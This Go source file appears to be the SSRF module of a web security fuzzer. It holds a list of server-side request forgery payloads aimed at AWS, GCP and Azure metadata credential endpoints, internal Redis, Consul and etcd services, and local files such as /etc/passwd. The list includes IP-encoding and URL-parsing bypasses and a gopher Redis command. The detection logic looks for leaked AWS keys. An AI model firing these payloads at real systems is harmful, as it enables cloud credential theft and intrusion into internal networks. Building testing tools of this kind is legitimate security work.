package vulns

import (
	"fmt"
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type SSRFModule struct{}

func (m *SSRFModule) Name() string        { return "ssrf" }
func (m *SSRFModule) Description() string { return "Server-Side Request Forgery" }

func (m *SSRFModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := ssrfPayloads()
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{Value: p.value, Point: point, Module: "ssrf", Variant: p.variant})
		}
	}
	return payloads
}

func (m *SSRFModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Detecção de metadata AWS
	awsIndicators := []string{
		"iam", "security-credentials", "ami-id", "instance-id",
		"AccessKeyId", "SecretAccessKey", "Token", "meta-data",
	}
	for _, ind := range awsIndicators {
		if strings.Contains(respBody, ind) && !strings.Contains(baseBody, ind) {
			return &Finding{
				Module:      "ssrf",
				Severity:    "critical",
				Confidence:  "confirmed",
				Title:       "SSRF — AWS Metadata acessado",
				Description: "Server accessed AWS metadata service (169.254.169.254)",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "AWS indicator '" + ind + "' found in response",
				OWASP:       "A10:2021 SSRF",
				CWE:         "CWE-918",
			}
		}
	}

	// Detecção de conteúdo interno
	internalIndicators := []string{
		"root:x:0:0", "localhost", "127.0.0.1",
		"internal server", "connection refused", "no route to host",
		"private", "intranet",
	}
	for _, ind := range internalIndicators {
		if strings.Contains(strings.ToLower(respBody), ind) && !strings.Contains(strings.ToLower(baseBody), ind) {
			sev := "high"
			if ind == "root:x:0:0" {
				sev = "critical"
			}
			return &Finding{
				Module:      "ssrf",
				Severity:    sev,
				Confidence:  "high",
				Title:       "SSRF — Acesso a recurso interno",
				Description: "Server accessed internal/localhost resource",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    "Indicator '" + ind + "' in response",
				OWASP:       "A10:2021 SSRF",
				CWE:         "CWE-918",
			}
		}
	}

	// Status code diferente pode indicar que o servidor fez a request
	if respStatus != baseStatus && (respStatus == 200 || respStatus == 500) {
		if strings.Contains(payload.Variant, "metadata") || strings.Contains(payload.Variant, "internal") {
			return &Finding{
				Module:      "ssrf",
				Severity:    "medium",
				Confidence:  "low",
				Title:       "SSRF — Comportamento diferencial",
				Description: "Status code changed with SSRF payload, indicating server-side processing",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    fmt.Sprintf("baseline=%d, response=%d", baseStatus, respStatus),
				OWASP:       "A10:2021 SSRF",
				CWE:         "CWE-918",
			}
		}
	}

	return nil
}

type ssrfPayload struct {
	value   string
	variant string
}

func ssrfPayloads() []ssrfPayload {
	return []ssrfPayload{
		// AWS metadata
		{`http://169.254.169.254/latest/meta-data/`, "metadata"},
		{`http://169.254.169.254/latest/meta-data/iam/security-credentials/`, "metadata-iam"},
		{`http://169.254.169.254/latest/dynamic/instance-identity/document`, "metadata-identity"},
		{`http://169.254.169.254/latest/user-data`, "metadata-userdata"},

		// IMDSv2 bypass attempts
		{`http://[::ffff:169.254.169.254]/latest/meta-data/`, "metadata-ipv6"},
		{`http://169.254.169.254.nip.io/latest/meta-data/`, "metadata-dns"},
		{`http://0xA9FEA9FE/latest/meta-data/`, "metadata-hex"},
		{`http://2852039166/latest/meta-data/`, "metadata-decimal"},
		{`http://0251.0376.0251.0376/latest/meta-data/`, "metadata-octal"},
		{`http://169.254.169.254:80/latest/meta-data/`, "metadata-port"},
		{`http://169.254.169.254:443/latest/meta-data/`, "metadata-https"},

		// GCP metadata
		{`http://metadata.google.internal/computeMetadata/v1/`, "gcp-metadata"},
		{`http://169.254.169.254/computeMetadata/v1/`, "gcp-metadata2"},

		// Azure metadata
		{`http://169.254.169.254/metadata/instance?api-version=2021-02-01`, "azure-metadata"},

		// Internal services
		{`http://127.0.0.1/`, "internal-localhost"},
		{`http://127.0.0.1:8080/`, "internal-8080"},
		{`http://127.0.0.1:3000/`, "internal-3000"},
		{`http://127.0.0.1:6379/`, "internal-redis"},
		{`http://127.0.0.1:9200/`, "internal-elastic"},
		{`http://127.0.0.1:27017/`, "internal-mongo"},
		{`http://localhost:8500/v1/agent/members`, "internal-consul"},
		{`http://127.0.0.1:2379/version`, "internal-etcd"},

		// Bypass techniques
		{`http://0.0.0.0/`, "bypass-zero"},
		{`http://0/`, "bypass-zero-short"},
		{`http://[::]/`, "bypass-ipv6"},
		{`http://[0:0:0:0:0:ffff:127.0.0.1]/`, "bypass-ipv6-mapped"},
		{`http://127.1/`, "bypass-short"},
		{`http://127.0.1/`, "bypass-short2"},
		{`http://2130706433/`, "bypass-decimal-localhost"},
		{`http://017700000001/`, "bypass-octal-localhost"},
		{`http://0x7f000001/`, "bypass-hex-localhost"},

		// Protocol smuggling
		{`gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a`, "gopher-redis"},
		{`dict://127.0.0.1:6379/INFO`, "dict-redis"},
		{`file:///etc/passwd`, "file-read"},
		{`file:///proc/self/environ`, "file-env"},
		{`file:///proc/self/cmdline`, "file-cmdline"},

		// URL parsing tricks
		{`http://evil.com@127.0.0.1/`, "url-at"},
		{`http://127.0.0.1#@evil.com/`, "url-fragment"},
		{`http://127.0.0.1%23@evil.com/`, "url-encoded-hash"},
		{`http://127.0.0.1:80@evil.com/`, "url-port-at"},
		{`http://evil.com\@127.0.0.1/`, "url-backslash"},

		// DNS rebinding
		{`http://spoofed.burpcollaborator.net/`, "dns-rebind"},

		// Open redirect → SSRF
		{`/redirect?url=http://169.254.169.254/`, "redirect-ssrf"},
		{`//169.254.169.254/latest/meta-data/`, "protocol-relative"},
	}
}
